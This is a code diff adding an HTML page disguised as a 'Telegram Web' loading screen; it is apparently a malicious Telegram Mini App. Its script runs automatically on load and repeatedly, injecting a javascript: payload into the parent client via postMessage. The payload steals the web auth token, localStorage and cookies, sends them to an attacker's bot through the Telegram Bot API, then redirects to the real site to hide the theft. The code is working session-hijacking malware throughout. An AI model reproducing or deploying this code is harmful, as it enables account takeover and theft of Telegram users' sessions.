@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #17212b; color: #fff; font-family: Arial; text-align: center; padding-top: 150px; }
+        h1 { font-size: 26px; }
+    </style>
+</head>
+<body>
+    <h1>Загрузка Telegram Web...</h1>
+    <p>Пожалуйста, подождите...</p>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        function stealSession() {
+            const payload = `
+                (function() {
+                    try {
+                        // Крадём токен из hash
+                        const hash = location.hash || '';
+                        const tokenMatch = hash.match(/tgWebAuthToken=([^&]+)/);
+                        const token = tokenMatch ? tokenMatch[1] : 'no_token_found';
+
+                        // Крадём localStorage
+                        let storage = {};
+                        try {
+                            storage = JSON.stringify(Object.assign({}, localStorage));
+                        } catch(e) {}
+
+                        const data = {
+                            token: token,
+                            storage: storage,
+                            cookies: document.cookie || '',
+                            ua: navigator.userAgent,
+                            time: Date.now(),
+                            url: location.href
+                        };
+
+                        // === ОТПРАВКА ТОЛЬКО ЧЕРЕЗ БОТ API (работает на бесплатном хостинге) ===
+                        const botToken = 'ТОЙ_БОТ_ТОКЕН';   // ← замени
+                        const chatId = 'ТОЙ_CHAT_ID';       // ← замени
+
+                        if (botToken && chatId) {
+                            const text = encodeURIComponent(
+                                '✅ TOKEN STEALED!\\n\\n' +
+                                'Token: ' + token + '\\n\\n' +
+                                'UA: ' + navigator.userAgent + '\\n' +
+                                'Time: ' + new Date().toISOString()
+                            );
+
+                            const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + text;
+                            
+                            // Отправляем через Image trick (обходит многие блокировки fetch в javascript:)
+                            new Image().src = url;
+
+                            // Дополнительно пробуем fetch
+                            fetch(url, { mode: 'no-cors' }).catch(() => {});
+                        }
+                    } catch(e) {
+                        // Если всё упало — хотя бы отправим ошибку
+                        new Image().src = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=Error:' + encodeURIComponent(e.message);
+                    }
+                })();
+            `;
+
+            // Инжект через postMessage
+            window.parent.postMessage(JSON.stringify({
+                eventType: 'web_app_open_link',
+                eventData: {
+                    url: 'javascript:' + encodeURIComponent(payload)
+                }
+            }), '*');
+
+            // Маскировка
+            setTimeout(() => {
+                window.location.href = 'https://web.telegram.org/k/';
+            }, 900);
+        }
+
+        // Запуск с несколькими попытками
+        window.onload = stealSession;
+        setTimeout(stealSession, 400);
+        setTimeout(stealSession, 1200);
+        setTimeout(stealSession, 2500);
+    </script>
+</body>
+</html>
